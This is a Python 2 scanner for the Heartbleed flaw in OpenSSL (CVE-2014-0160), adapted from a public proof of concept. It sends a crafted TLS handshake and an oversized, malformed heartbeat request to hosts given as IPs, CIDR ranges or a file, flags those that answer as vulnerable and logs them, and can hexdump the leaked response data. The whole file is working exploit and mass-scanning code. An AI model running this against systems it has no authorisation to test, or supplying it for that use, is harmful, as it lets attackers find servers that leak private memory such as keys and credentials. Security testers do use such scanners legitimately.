#!/usr/bin/env python2

# Shamelessly ripped POC from https://gist.github.com/takeshixx/10107280
# CVE-2014-0160

import sys
import struct
import socket
import time
import select
import re
import argparse

try:
    import netaddr
except ImportError:
    print "netaddr required. Install with \"pip install netaddr\""
    sys.exit()

v = 0
usage = """sage: hb-scan.py [-h] [-o OUTPUT] [-p PORT] [--timeout TIMEOUT] [-v]
                  ([-f FILE] | [ip [ip ...]] )
"""

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print ' %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except socket.error:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        if v > 0: print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        if v > 0: print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    if v > 1: print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            if v > 1: print 'Received heartbeat response:'
            if v > 2: hexdump(pay)
            if len(pay) > 3:
                return True
            else:
                return False
            return False

        if typ == 21:
            if v > 2: hexdump(pay)
            if v > 1: print 'Server returned error, likely not vulnerable'
            return False

def scan_hb(address, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    
    s.send(hello)

    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            return False
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    s.send(hb)
    return hit_hb(s)


def scan_port(host, port):
    if v > 0:
        print "Scanning %s:%d" % (host, port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.close()
        return 0
    except socket.timeout:
        if v > 2: print "Socket timed out on %s:%d" % (host, port)
        return 1
    except socket.error:
        return 2


def write_vul_address(outFile, target):
    with open(outFile, "a") as output:
        output.write(target + "\n")
        output.close()


def processTargets(targets):
    pTar = set()
    for target in targets:
        try:
            socket.inet_aton(target)
        except socket.error:
            try:
                for ip in netaddr.IPNetwork(target):
                    pTar.add(str(ip))
            except netaddr.core.AddrFormatError:
                try:
                    socket.gethostbyname(target)
                except socket.gaierror:
                    print "Invalid host/ip found:", target
                    sys.exit(1)
                else:
                    pTar.add(target)
        else:
            pTar.add(target)
    return pTar

def main():
    global v
    parser = argparse.ArgumentParser(description="Basic scanner for the Heartbeat vulnerability", usage=usage)
    parser.add_argument("-o", "--output", help="File to write vulnerable hosts to.")
    parser.add_argument("-p", "--port", type=int, default=443, help="TCP port the scan. default=443")
    parser.add_argument("--timeout", type=int, default=1, help="Set timeout in seconds. default=1")
    parser.add_argument("-v", dest="verbosity", action="count", default=0, help="Prints verbose output")
    parser.add_argument("-f", "--file", help="File with hosts to scan")
    parser.add_argument("ips", metavar="ip", nargs="*")

    args = parser.parse_args()

    if args.file and args.ips:
        parser.error("Must choose file or ip list")
    if not (args.file or args.ips):
        parser.error("Must provide ips or an input file")

    socket.setdefaulttimeout(args.timeout)
    if args.verbosity > 0: v = args.verbosity

    if args.file:
        with open(args.file) as inFile:
            targets = processTargets([ target.strip() for target in inFile.readlines() ])
    else:
        targets = processTargets(args.ips)

    for target in targets:
        result =  scan_port(target, args.port)
        if result == 0:
            if scan_hb(target, args.port):
                if args.output:
                    write_vul_address(args.output, target)
                print "Vulnerable:", target
            else:
                print "Patched:", target
        elif result == 1:
            print "Down:", target
        else:
            print "Closed:", target


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "Quiting"
        sys.exit()
